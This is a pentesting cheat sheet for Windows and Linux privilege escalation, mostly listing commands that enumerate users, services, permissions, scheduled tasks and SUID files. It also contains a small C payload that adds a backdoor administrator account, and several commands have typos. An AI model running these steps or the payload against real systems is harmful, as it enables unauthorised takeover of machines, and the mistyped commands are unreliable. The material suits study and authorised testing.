# Windows Privelege Escalation

```
# Identifies the current user
whomami

# Gather details about the user including group membership
net user $user

# Identify user accounts on the system
net user 

# Identify the name of the victim's machine
hostname

# Gather the OS and architecture info using systeminfo command and findstr command
systeminfo | findstr /B /C:"OS Name" /C:"OS Verson" /C:"System Type"

# List running processes by now-priv user
tasklist /svc

# Gather TCP/IP configuration of all adapters
ipconfig /all

# Display the network routing table
route print

# Display active network connections via listening and established ports
netstat -ano

# Display firewall profile
netsh advfirewall show currentprofile

# Display the active firewall rules
netsh advfirewall show rule name=all

# View scheduled tasks
schtasks /query /fo LIST /v

# Enumerate install applications installed by windows installer and patch levels 
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn

# Look for insecure file permissions
accesschk.exe -uws "Everyone" "C:\Program Files"
get-childitem "C:\Program Files\" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# Enumerate all drives currently mounted
mountvol 

# List drivers
driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path

# Gather the version number of the loader driver
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | where-Object {$_.DeviceName -like "*VMWare*"}

# Check for AlwaysInstallElevated registry setting
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_Local_USER\Software\Policies\Microsoft\Windows\Installer

# Automated privesc tools
windows-privesc-check2.exe -h 
windows-privesc-check2.exe --dump -G (Dump security groups info)

# To determine your integrity level
whoami /groups

# Determine current user privileges from command prompt
whoami /priv

# Determine users in the administrative group
net localgroup Administrators

# Run powershell as administrator
powershell.exe start-process cmd.exe -Verb runAs 

# List running services
Get-WmiObject win32_service | Select-Object Name, State, PathName | where-object {$_.State -like 'Running'}

# Enumerate service permissions 
icacls "C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe"

# Use wmic to check the start options of a service
wmic service where caption="ServiceName" get name, caption, state, startmode 

# Exploit weak file permissions
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  return 0
}

# Compile c code in Wine
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```


# Linux Privelege Escalation

```
# Gather the user user identifier (UID) and group identifier (GID)
id 

# Identify user accounts on the system
cat /etc/passwd  

# Identify the name of the victim's machine
hostname

# Gather OS info
cat /etc/issue
cat /etc/*-release

# Gather the kernel version 
uname -a 

# List system processes run by privileged non-priv and priv users
ps axu

# Gather TCP/IP configuration of all adapters
ifconfig or ip a

# Display network routing table
route
routel
ss -anp

# View scheduled tasks
ls -lah /etc/cron*
cat /etc/crontab

# List installed packages
dpkg -l (Debian based)
rpm (Red Hat based)

# Look for insecure directory and file permissions
find / -writeable -type d 2>/dev/null 

# Enumerate all drives currently mounted
mount
cat /etc/fstab

# View available disks
/bin/lsblk

# Enumerate loaded kernel modules
lsmod 

# Find additional information about a specific module
lsmod 
/sbin/modinfo libata

# Search for SUID files
find / -perm -u=s -type f 2>/dev/null 

# Automated privesc tools
./unix-privesc-check 
./unix-privesc-check standard > output.txt

```
